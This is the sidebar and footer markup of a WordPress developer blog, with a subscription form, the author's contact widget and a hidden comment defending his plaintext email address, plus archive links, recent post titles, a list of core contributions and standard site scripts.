<li id="blog_subscription-3" class="widget jetpack_subscription_widget"><h2 class="widgettitle"><label for="subscribe-field"></label></h2>

		<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-3">
			<p id="subscribe-text">Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p><p>Join 328 other subscribers</p>

			<p id="subscribe-email"><input type="text" name="email" value="Email Address" id="subscribe-field" onclick="if ( this.value == 'Email Address' ) { this.value = ''; }" onblur="if ( this.value == '' ) { this.value = 'Email Address'; }" /></p>

			<p id="subscribe-submit">
				<input type="hidden" name="action" value="subscribe" />
				<input type="hidden" name="source" value="http://ottopress.com/category/code/page/5/" />
				<input type="hidden" name="sub-type" value="widget" />
				<input type="hidden" name="redirect_fragment" value="blog_subscription-3" />
								<input type="submit" value="Subscribe" name="jetpack_subscriptions_widget" />
			</p>
		</form>

		
</li>
<li id="text-3" class="widget widget_text"><h2 class="widgettitle">Email Me</h2>
			<div class="textwidget"><ul><li><span class="vcard microid-mailto+http:sha1:23e9670868f6d2b16fe1f6b3db80c8f0423a082a">
<span style="display:none;">
<span class="adr">
 <span class="locality">Memphis</span>,
 <span class="region">TN</span>
 <span class="postal-code">38103</span>
 <span class="country-name">U.S.A.</span>
</span>
<a class="url fn" href="http://ottodestruct.com">Otto</a>
<span class="uid">240cf86e-5cad-11dc-8314-0800200c9a66</span>
</span>
<a class="email" href="mailto:otto@ottodestruct.com">otto@ottodestruct.com</a></span></li></ul>
<a rel="author" href="https://plus.google.com/100201852715113506716?rel=author">
  <img src="https://ssl.gstatic.com/images/icons/gplus-16.png" width="16" height="16">
</a>
</a>
<!-- 

This rant is hidden in HTML comments. If I pointed you to it, then you probably emailed me about the fact that my email address is in plaintext directly above this comment. If you happened to run across it because you just like looking at HTML comments, well, easter egg! :)

YES, that is a bare mailto: href above. 
YES, that is my real email address. 
And YES, it's intentional.

Obfuscating your email address on the web is stupid. 

Firstly, hiding your email address doesn't prevent spam. Spammers get addresses in bulk from mailing lists and websites and other sources. Sure, some scrapers exist, but they are by far the minority of the sources for email lists.

Secondly, hiding your email address ruins the whole point of email. The purpose of publishing my email address is so that anybody, and I do mean *anybody*, can email me. Before the days of cell phones, your phone number and physical address used to be published in a big book that everybody received, for free, on a semi-annual basis. It had distinctive yellow pages in it. Your contact information is not, and never was supposed to be, private information. Treating it as such is stupid.

Thirdly, I have great spam protection. For one, I use GMail, which has frankly incredible filtering because of the volume of mail they deal with. For another, I use various sets of filters to categorize incoming mail into various categories of things. Hell, I can even run statistics on it, if I want. This is a much better solution than continually giving out fake email addresses, or using +stuff to figure out who sent what where... I'd prefer to simply let my filters deal with it instead. 

Finally, if you're one of those systems that scours the web and/or social networks for visible email addresses and then automatically emails that person to let them know that their address is visible, then by all means please just fuck off and die. You're part of the problem. On the other hand, if you're just a regular guy with good intentions, then this doesn't apply to you. :)

Just my 2 cents.

--></div>
		</li>
<li id="categories-2" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>
		<ul>
	<li class="cat-item cat-item-573 current-cat"><a href="http://ottopress.com/category/code/" title="View all posts filed under Code">Code</a>
</li>
	<li class="cat-item cat-item-574"><a href="http://ottopress.com/category/other/" title="View all posts filed under Other">Other</a>
</li>
	<li class="cat-item cat-item-575"><a href="http://ottopress.com/category/rants/" title="View all posts filed under Rants">Rants</a>
</li>
	<li class="cat-item cat-item-1"><a href="http://ottopress.com/category/uncategorized/" title="View all posts filed under Uncategorized">Uncategorized</a>
</li>
	<li class="cat-item cat-item-576"><a href="http://ottopress.com/category/wordpress/" title="View all posts filed under WordPress">WordPress</a>
</li>
		</ul>
</li>
<li id="archives-2" class="widget widget_archive"><h2 class="widgettitle">Archives</h2>
		<ul>
	<li><a href='http://ottopress.com/2014/02/'>February 2014</a></li>
	<li><a href='http://ottopress.com/2013/11/'>November 2013</a></li>
	<li><a href='http://ottopress.com/2013/10/'>October 2013</a></li>
	<li><a href='http://ottopress.com/2013/06/'>June 2013</a></li>
	<li><a href='http://ottopress.com/2013/03/'>March 2013</a></li>
	<li><a href='http://ottopress.com/2012/11/'>November 2012</a></li>
	<li><a href='http://ottopress.com/2012/09/'>September 2012</a></li>
	<li><a href='http://ottopress.com/2012/08/'>August 2012</a></li>
	<li><a href='http://ottopress.com/2012/07/'>July 2012</a></li>
	<li><a href='http://ottopress.com/2012/05/'>May 2012</a></li>
	<li><a href='http://ottopress.com/2012/02/'>February 2012</a></li>
	<li><a href='http://ottopress.com/2012/01/'>January 2012</a></li>
	<li><a href='http://ottopress.com/2011/12/'>December 2011</a></li>
	<li><a href='http://ottopress.com/2011/11/'>November 2011</a></li>
	<li><a href='http://ottopress.com/2011/10/'>October 2011</a></li>
	<li><a href='http://ottopress.com/2011/09/'>September 2011</a></li>
	<li><a href='http://ottopress.com/2011/08/'>August 2011</a></li>
	<li><a href='http://ottopress.com/2011/07/'>July 2011</a></li>
	<li><a href='http://ottopress.com/2011/06/'>June 2011</a></li>
	<li><a href='http://ottopress.com/2011/05/'>May 2011</a></li>
	<li><a href='http://ottopress.com/2011/04/'>April 2011</a></li>
	<li><a href='http://ottopress.com/2011/03/'>March 2011</a></li>
	<li><a href='http://ottopress.com/2011/02/'>February 2011</a></li>
	<li><a href='http://ottopress.com/2011/01/'>January 2011</a></li>
	<li><a href='http://ottopress.com/2010/12/'>December 2010</a></li>
	<li><a href='http://ottopress.com/2010/11/'>November 2010</a></li>
	<li><a href='http://ottopress.com/2010/10/'>October 2010</a></li>
	<li><a href='http://ottopress.com/2010/09/'>September 2010</a></li>
	<li><a href='http://ottopress.com/2010/08/'>August 2010</a></li>
	<li><a href='http://ottopress.com/2010/06/'>June 2010</a></li>
	<li><a href='http://ottopress.com/2010/05/'>May 2010</a></li>
	<li><a href='http://ottopress.com/2010/04/'>April 2010</a></li>
	<li><a href='http://ottopress.com/2010/03/'>March 2010</a></li>
	<li><a href='http://ottopress.com/2010/02/'>February 2010</a></li>
	<li><a href='http://ottopress.com/2009/11/'>November 2009</a></li>
	<li><a href='http://ottopress.com/2009/09/'>September 2009</a></li>
	<li><a href='http://ottopress.com/2008/09/'>September 2008</a></li>
		</ul>
</li>
		<li id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widgettitle">Recent Posts</h2>
		<ul>
					<li>
				<a href="http://ottopress.com/2014/better-know-a-vulnerability-cross-site-request-forgery-csrf/">Better Know a Vulnerability: Cross Site Request Forgery (CSRF)</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/better-know-a-vulnerability-sql-injection/">Better Know a Vulnerability: SQL Injection</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/language-packs-101-prepwork/">Language Packs 101 &#8211; Prepwork</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/slides-a-presentation-theme/">Slides: A Presentation Theme</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/im-not-a-fan-of-orange/">I&#8217;m not a fan of orange&#8230;</a>
						</li>
				</ul>
		</li>
<li id="text-6" class="widget widget_text"><h2 class="widgettitle">WP Core Contributions</h2>
			<div class="textwidget"><p>
<a href='http://core.trac.wordpress.org/changeset/28072'>[28072]</a> - <a href='http://core.trac.wordpress.org/ticket/19393'>#19393</a><br />
<a href='http://core.trac.wordpress.org/changeset/27522'>[27522]</a> - <a href='http://core.trac.wordpress.org/ticket/19889'>#19889</a><br />
<a href='http://core.trac.wordpress.org/changeset/27399'>[27399]</a> - <a href='http://core.trac.wordpress.org/ticket/25665'>#25665</a><br />
<a href='http://core.trac.wordpress.org/changeset/26978'>[26978]</a> - <a href='http://core.trac.wordpress.org/ticket/23149'>#23149</a><br />
<a href='http://core.trac.wordpress.org/changeset/26711'>[26711]</a> - <a href='http://core.trac.wordpress.org/ticket/21442'>#21442</a><br />
<a href='http://core.trac.wordpress.org/changeset/26072'>[26072]</a> - <a href='http://core.trac.wordpress.org/ticket/25858'>#25858</a><br />
<a href='http://core.trac.wordpress.org/changeset/22152'>[22152]</a> - <a href='http://core.trac.wordpress.org/ticket/21914'>#21914</a><br />
<a href='http://core.trac.wordpress.org/changeset/22026'>[22026]</a> - <a href='http://core.trac.wordpress.org/ticket/22002'>#22002</a><br />
<a href='http://core.trac.wordpress.org/changeset/21839'>[21839]</a> - <a href='http://core.trac.wordpress.org/ticket/16996'>#16996</a><br />
<a href='http://core.trac.wordpress.org/changeset/21802'>[21802]</a> - <a href='http://core.trac.wordpress.org/ticket/18674'>#18674</a><br />
<a href='http://core.trac.wordpress.org/changeset/21776'>[21776]</a> - <a href='http://core.trac.wordpress.org/ticket/13729'>#13729</a><br />
<a href='http://core.trac.wordpress.org/changeset/21609'>[21609]</a> - <a href='http://core.trac.wordpress.org/ticket/19324'>#19324</a><br />
<a href='http://core.trac.wordpress.org/changeset/20916'>[20916]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20784'>[20784]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20783'>[20783]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20267'>[20267]</a> - <a href='http://core.trac.wordpress.org/ticket/13774'>#13774</a><br />
<a href='http://core.trac.wordpress.org/changeset/19721'>[19721]</a> - <a href='http://core.trac.wordpress.org/ticket/19626'>#19626</a><br />
<a href='http://core.trac.wordpress.org/changeset/19003'>[19003]</a> - <a href="http://core.trac.wordpress.org/ticket/17406">#17406</a><br />
<a href='http://core.trac.wordpress.org/changeset/18741'>[18741]</a> - <a href="http://core.trac.wordpress.org/ticket/15473">#15473</a><br />
<a href='http://core.trac.wordpress.org/changeset/18602'>[18602]</a> - <a href="http://core.trac.wordpress.org/ticket/18230">#18230</a><br />
<a href='http://core.trac.wordpress.org/changeset/18541'>[18541]</a> - <a href="http://core.trac.wordpress.org/ticket/16687">#16687</a><br />
<a href='http://core.trac.wordpress.org/changeset/18205'>[18205]</a> - <a href="http://core.trac.wordpress.org/ticket/17148">#17148</a><br />
<a href='http://core.trac.wordpress.org/changeset/17254'>[17254]</a> - <a href="http://core.trac.wordpress.org/ticket/16192">#16192</a><br />
<a href='http://core.trac.wordpress.org/changeset/16555'>[16555]</a> - <a href="http://core.trac.wordpress.org/ticket/12891">#12891</a><br />
<a href='http://core.trac.wordpress.org/changeset/16284'>[16284]</a> - <a href="http://core.trac.wordpress.org/ticket/13324">#13324</a><br />
<a href='http://core.trac.wordpress.org/changeset/13420'>[13420]</a> - <a href="http://core.trac.wordpress.org/ticket/12291">#12291</a><br />
<a href='http://core.trac.wordpress.org/changeset/12581'>[12581]</a> - <a href="http://core.trac.wordpress.org/ticket/7225">#7225</a><br />
<a href='http://core.trac.wordpress.org/changeset/11738'>[11738]</a> - <a href="http://core.trac.wordpress.org/ticket/10145">#10145</a><br />
<a href='http://core.trac.wordpress.org/changeset/11329'>[11329]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10962'>[10962]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10757'>[10757]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10753'>[10753]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10252'>[10252]</a> - <a href="http://core.trac.wordpress.org/ticket/6791">#6791</a><br />
<a href='http://core.trac.wordpress.org/changeset/9276'>[9276]</a> - <a href="http://core.trac.wordpress.org/ticket/7124">#7124</a><br />
<a href='http://core.trac.wordpress.org/changeset/9209'>[9209]</a> - <a href="http://core.trac.wordpress.org/ticket/7901">#7901</a><br />
<a href='http://core.trac.wordpress.org/changeset/9207'>[9207]</a> - <a href="http://core.trac.wordpress.org/ticket/7635">#7635</a><br />
<a href='http://core.trac.wordpress.org/changeset/9139'>[9139]</a> - <a href="http://core.trac.wordpress.org/ticket/7847">#7847</a><br />
<a href='http://core.trac.wordpress.org/changeset/9089'>[9089]</a> - <a href="http://core.trac.wordpress.org/ticket/7772">#7772</a><br />
<a href='http://core.trac.wordpress.org/changeset/8968'>[8968]</a> - <a href="http://core.trac.wordpress.org/ticket/7761">#7761</a><br />
<a href='http://core.trac.wordpress.org/changeset/8285'>[8285]</a> - <a href="http://core.trac.wordpress.org/ticket/6879">#6879</a><br />
<a href='http://core.trac.wordpress.org/changeset/8208'>[8208]</a> - <a href="http://core.trac.wordpress.org/ticket/4448">#4448</a><br />
<a href='http://core.trac.wordpress.org/changeset/8132'>[8132]</a> - <a href="http://core.trac.wordpress.org/ticket/4954">#4954</a><br />
<a href='http://core.trac.wordpress.org/changeset/8131'>[8131]</a> - <a href="http://core.trac.wordpress.org/ticket/6590">#6590</a><br />
<a href='http://core.trac.wordpress.org/changeset/7869'>[7869]</a> - <a href="http://core.trac.wordpress.org/ticket/6513">#6513</a><br />
<a href='http://core.trac.wordpress.org/changeset/7647'>[7647]</a> - <a href="http://core.trac.wordpress.org/ticket/6608">#6608</a><br />
<a href='http://core.trac.wordpress.org/changeset/7461'>[7461]</a> - <a href="http://core.trac.wordpress.org/ticket/6339">#6339</a><br />
<a href='http://core.trac.wordpress.org/changeset/6873'>[6873]</a> - <a href="http://core.trac.wordpress.org/ticket/4986">#4986</a><br />
<a href='http://core.trac.wordpress.org/changeset/6760'>[6760]</a> - <a href="http://core.trac.wordpress.org/ticket/4617">#4617</a><br />
<a href='http://core.trac.wordpress.org/changeset/6616'>[6616]</a> - <a href="http://core.trac.wordpress.org/ticket/5155">#5155</a><br />
<a href='http://core.trac.wordpress.org/changeset/6439'>[6439]</a> - <a href="http://core.trac.wordpress.org/ticket/2805">#2805</a><br />
<a href='http://core.trac.wordpress.org/changeset/6091'>[6091]</a> - <a href="http://core.trac.wordpress.org/ticket/4182">#4182</a><br />
<a href='http://core.trac.wordpress.org/changeset/6086'>[6086]</a> - <a href="http://core.trac.wordpress.org/ticket/4946">#4946</a><br />
<a href='http://core.trac.wordpress.org/changeset/5986'>[5986]</a> - <a href="http://core.trac.wordpress.org/ticket/4873">#4873</a><br />
<a href='http://core.trac.wordpress.org/changeset/5982'>[5982]</a> - <a href="http://core.trac.wordpress.org/ticket/4800">#4800</a><br />
<a href='http://core.trac.wordpress.org/changeset/5958'>[5958]</a> - <a href="http://core.trac.wordpress.org/ticket/4625">#4625</a><br />
<a href='http://core.trac.wordpress.org/changeset/5920'>[5920]</a> - <a href="http://core.trac.wordpress.org/ticket/4703">#4703</a><br />
<a href='http://core.trac.wordpress.org/changeset/5910'>[5910]</a> - <a href="http://core.trac.wordpress.org/ticket/4654">#4654</a><br />
<a href='http://core.trac.wordpress.org/changeset/5881'>[5881]</a> - <a href="http://core.trac.wordpress.org/ticket/4704">#4704</a><br />
<a href='http://core.trac.wordpress.org/changeset/5857'>[5857]</a> - <a href="http://core.trac.wordpress.org/ticket/4625">#4625</a><br />
<a href='http://core.trac.wordpress.org/changeset/5848'>[5848]</a> - <a href="http://core.trac.wordpress.org/ticket/4499">#4499</a><br />
<a href='http://core.trac.wordpress.org/changeset/5845'>[5845]</a> - <a href="http://core.trac.wordpress.org/ticket/4547">#4547</a><br />
<a href='http://core.trac.wordpress.org/changeset/5317'>[5317]</a> - <a href="http://core.trac.wordpress.org/ticket/4169">#4169</a><br />
<a href='http://core.trac.wordpress.org/changeset/5154'>[5154]</a> - <a href="http://core.trac.wordpress.org/ticket/4057">#4057</a><br />
<a href='http://core.trac.wordpress.org/changeset/5151'>[5151]</a> - <a href="http://core.trac.wordpress.org/ticket/4057">#4057</a><br />
<a href='http://core.trac.wordpress.org/changeset/5104'>[5104]</a> - <a href="http://core.trac.wordpress.org/ticket/3790">#3790</a><br />
<a href='http://core.trac.wordpress.org/changeset/4964'>[4964]</a> - <a href="http://core.trac.wordpress.org/ticket/3898">#3898</a><br />
</p></div>
		</li>
		</ul>
	</div>

</div>
<div id="footer">
<div style="float:left;"><a href="http://internetdefenseleague.org"><img src="http://internetdefenseleague.org/images/badges/final/footer_badge.png" alt="Member of The Internet Defense League" /></a></div>
<a href="http://ottopress.com/feed/">Entries (RSS)</a> and <a href="http://ottopress.com/comments/feed/">Comments (RSS)</a>.<br />
<span about="http://ottodestruct.com/" xmlns:cc="http://creativecommons.org/ns#">
This page, by <a property="cc:attributionName" rel="cc:attributionURL" href="http://ottodestruct.com/">Otto</a>, is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/">Creative Commons Attribution-ShareAlike License</a>.</span><br />
Powered by <a href="http://wordpress.org/" title="Powered by WordPress.">WordPress</a>.<br />
		<script type="text/javascript">
		//<![CDATA[
		var infiniteScroll = {"settings":{"id":"content","ajaxurl":"http:\/\/ottopress.com\/?infinity=scrolling","type":"scroll","wrapper":false,"wrapper_class":"infinite-wrap","footer":false,"click_handle":"1","text":"Older posts","totop":"Scroll back to top","currentday":"25.05.11","order":"DESC","scripts":[],"styles":[],"google_analytics":false,"offset":5,"history":{"host":"ottopress.com","path":"\/category\/code\/page\/%d\/","use_trailing_slashes":true,"parameters":""},"query_args":{"paged":5,"category_name":"code","error":"","m":"","p":0,"post_parent":"","subpost":"","subpost_id":"","attachment":"","attachment_id":0,"name":"","static":"","pagename":"","page_id":0,"second":"","minute":"","hour":"","day":0,"monthnum":0,"year":0,"w":0,"tag":"","cat":573,"tag_id":"","author":"","author_name":"","feed":"","tb":"","comments_popup":"","meta_key":"","meta_value":"","preview":"","s":"","sentence":"","fields":"","menu_order":"","category__in":[],"category__not_in":[],"category__and":[],"post__in":[],"post__not_in":[],"tag__in":[],"tag__not_in":[],"tag__and":[],"tag_slug__in":[],"tag_slug__and":[],"post_parent__in":[],"post_parent__not_in":[],"author__in":[],"author__not_in":[],"posts_per_page":7,"ignore_sticky_posts":false,"suppress_filters":false,"cache_results":true,"update_post_term_cache":true,"update_post_meta_cache":true,"post_type":"","nopaging":false,"comments_per_page":"50","no_found_rows":false,"order":"DESC"},"last_post_date":"2010-12-28 14:50:20","stats":"blog=12342457&host=ottopress.com&v=ext&j=1:3.0.2&x_pagetype=infinite-jetpack"}};
		//]]>
		</script>
		<img alt='css.php' src="http://ottopress.com/wp-content/plugins/cookies-for-comments/css.php?k=c6a73cb029f035cdaa9e9e8336d25169&amp;o=i&amp;t=1855244839" width='1' height='1' />	<div style="display:none">
	</div>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPhp.js?ver=3.0.9'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushXml.js?ver=3.0.9'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPlain.js?ver=3.0.9'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();
</script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/infinite-scroll/infinity.js?ver=20140514'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/photon/photon.js?ver=20130122'></script>
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201430'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var mejsL10n = {"language":"en-US","strings":{"Close":"Close","Fullscreen":"Fullscreen","Download File":"Download File","Download Video":"Download Video","Play\/Pause":"Play\/Pause","Mute Toggle":"Mute Toggle","None":"None","Turn off Fullscreen":"Turn off Fullscreen","Go Fullscreen":"Go Fullscreen","Unmute":"Unmute","Mute":"Mute","Captions\/Subtitles":"Captions\/Subtitles"}};
var _wpmejsSettings = {"pluginPath":"\/wp-includes\/js\/mediaelement\/"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=2.14.2'></script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/mediaelement/wp-mediaelement.js?ver=3.9.1'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2014Julaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=3.9.1'></script>
<script type="text/javascript">
			jQuery.extend( infiniteScroll.settings.scripts, ["jquery-core","jquery-migrate","jquery","tiled-gallery","spin","jquery.spin","syntaxhighlighter-core","syntaxhighlighter-brush-php","syntaxhighlighter-brush-xml","syntaxhighlighter-brush-plain","the-neverending-homepage","jetpack-photon","devicepx","mediaelement","wp-mediaelement","grofiles-cards","wpgroho"] );
			jQuery.extend( infiniteScroll.settings.styles, ["yarppWidgetCss","jetpack-subscriptions","the-neverending-homepage","tiled-gallery","mediaelement","wp-mediaelement"] );
		</script>
	<script src="http://stats.wordpress.com/e-201430.js" type="text/javascript"></script>
	<script type="text/javascript">
	st_go({v:'ext',j:'1:3.0.2',blog:'12342457',post:'0',tz:'-5'});
	var load_cmc = function(){linktracker_init(12342457,0,2);};
	if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
	else load_cmc();
	</script></div></div>

<script type="text/javascript">
    window._idl = {};
    _idl.variant = "modal";
    (function() {
        var idl = document.createElement('script');
        idl.type = 'text/javascript';
        idl.async = true;
        idl.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'members.internetdefenseleague.org/include/?url=' + (_idl.url || '') + '&campaign=' + (_idl.campaign || '') + '&variant=' + (_idl.variant || 'banner');
        document.getElementsByTagName('body')[0].appendChild(idl);
    })();
</script>

</body>
</html>

